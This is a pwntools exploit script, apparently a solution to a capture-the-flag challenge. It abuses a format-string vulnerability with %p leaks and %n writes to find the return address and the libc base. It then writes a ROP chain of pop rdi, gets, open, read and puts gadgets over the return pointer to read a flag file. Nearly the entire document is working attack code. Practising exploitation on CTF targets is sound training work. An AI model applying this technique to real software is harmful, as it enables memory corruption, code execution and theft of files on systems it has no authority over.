from pwn import *
context.arch = 'amd64'


# binary = ELF('./main')

p = process('./main')
host = 'challs.xmas.htsp.ro'
port = 12003

# p=remote(host,port)

print(p.recvline().decode('utf-8'), end='')
p.sendline('something')
print(p.recvline().decode('utf-8'), end='')
print(p.recvline().decode('utf-8'), end='')
print(p.recvline().decode('utf-8'), end='')


def fmt_str(write):
    p.sendline(write)
    return p.recvline().decode('utf-8').strip('\n').split(' ')[-1]


# a function that writes data to specified address
# dont use this directly writing large values on stack will take too much time
def raw_writer(what, where):
    address = p64(where)
    print(address)
    value = str(int(what, 16))
    lval = len(value)
    padding = b'A'*(16 - lval - 5 - 2)
    print(len(padding))
    value = str(int(value) - len(padding))
    expad = ""
    while len(value+expad) != lval and lval >50:
        expad += 'x'
        value = str(int(value) - 1)

    value = str(value+expad).encode()

    # print(lval)
    # print(value)
    # if int(what, 16) < 20 :
    #     value = int(what,16)
    #     padding = b''
    #     padder = 
        

    format_string = padding + b"%" + value + b"x" b'%8$n ' + address + b'\n'


    if int(what,16) < 50:
        print('altwrt')
        value = int(what,16)
        padding = b'B' * value
        padder = b'C' * (16-5-len(padding))
        format_string = padding + b'%8$n ' + padder + address + b'\n' 
        

    #input('exploit ??')
    p.sendline(format_string)
    return p.recvline()


# Writes large data to specified address using lots of small writes
# this makes it faster and stable
def write(what, where):
    val2wrt = what[2:]
    while len(val2wrt) % 4 != 0:
        val2wrt = '0' + val2wrt
    values = []
    for x in range(len(val2wrt)//4):
        values.append(val2wrt[4*x: 4*x+4])
    values = values[::-1]

    offsets = list(range(len(values)))
    # for x in values:
    #     sz = int(x, 16)
    #     if sz < 100:
    #         if values.index(x) !=0:
    #             i = values.index(x)-1
    #             values[i] = values[i]+values[i+1]
    #             values.pop(i+1)
    #             offsets.pop(i+1)
    #         else:
    #             i = values.index(x)+1
    #             values[i] = values[i]+values[i-1]
    #             values.pop(i-1)
    #             values.pop(i-1)
    #

    # print(offsets)
    # print(values)
    for x in range(len(values)):
        # print('0x'+values[x])
        # print(where+x)
        raw_writer('0x'+values[x], where+2*offsets[x])


# determine the address of return pointer
# observation: difference btw 29th argument & the address(return ptr from main)
# is always 49
address_return_pointer = int(fmt_str('%29$p'), 16) + 0x31                       # suspecious need more attention
arp = address_return_pointer
log.success('Address or return pointer: ' + hex(arp))
################### Writable area in memory ########
writable_buffer = int(fmt_str('%4$p'), 16) 
buff = hex(writable_buffer)

###############################################################################
#################################### LIBC STUFF ###############################
###############################################################################

# Leaking libc base address
base = int(fmt_str('%41$p'), 16)
lba = base - 0x27153                                                            # suspecious need more attention
log.success('Libc base address: ' + hex(lba))

# Load Libc
libc = ELF('/lib/libc-2.30.so')
# libc=ELF('./libc-2.27.so')


# Symbol search for libc
def get_sym(symbol):
    return hex(libc.symbols[symbol] + lba)


# Gagets search for libc
def get_gadget(snip):
    return hex(next(libc.search(asm(snip))) + lba)


# Strings
bin_sh = hex(lba + next(libc.search(b'/bin/sh')))

############ symbol s#######
system = get_sym('system')
opn = get_sym('open')
read = get_sym('read')
puts = get_sym('puts')
gets = get_sym('gets')
printf = get_sym('printf')


############ gadgets ######
pop_rdi = get_gadget('pop rdi; ret')
pop_rsi = get_gadget('pop rsi; ret')
pop_rdx_pop_rbx = get_gadget('pop rdx;pop rbx;ret')
# pop_rdx_pop_r12 = get_gadget('pop rdx; pop r12; ret')
# pop_rax = get_gadget('pop rax;ret')
# push_rax = hex(next(libc.search(asm('push rax;ret')),2) + lba)#get_gadget('push rax;ret')
# zero_rax = get_gadget('xor rax, rax; ret')
# three_rax = get_gadget('mov rax, 3; ret')
ret = get_gadget('ret')
###############################################################################
###############################################################################

print(buff)
# input('exploit ?')
# ask the path to flag file
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(gets, arp); arp +=8

#open
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rsi, arp); arp +=8
write('0x0000', arp); arp+=8
write(opn, arp); arp +=8

#read
write(pop_rdi, arp); arp +=8
write('0x0003', arp); arp+=8
write(pop_rsi, arp); arp +=8
write(buff, arp); arp +=8
write(pop_rdx_pop_rbx, arp); arp +=8
# write(pop_rdx, arp); arp +=8
write('0x0123', arp); arp+=8
write('0x0003', arp); arp+=8
write(read, arp); arp +=8

#puts
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8
write(pop_rdi, arp); arp +=8
write(buff, arp); arp +=8
write(puts, arp); arp +=8



# print(hex(system))
# print(hex(bin_sh))
# print(hex(pop_rdi))
#
# write(hex(puts), address_return_pointer+16)
# # write(hex(bin_sh), address_return_pointer+24)
# write(hex(bin_sh), address_return_pointer+8)
# write(hex(pop_rdi), address_return_pointer)
# # write(hex(ret), address_return_pointer)
#
# print(hex(address_return_pointer))
p.sendline('end of letter')
print(p.recvline())
p.interactive()
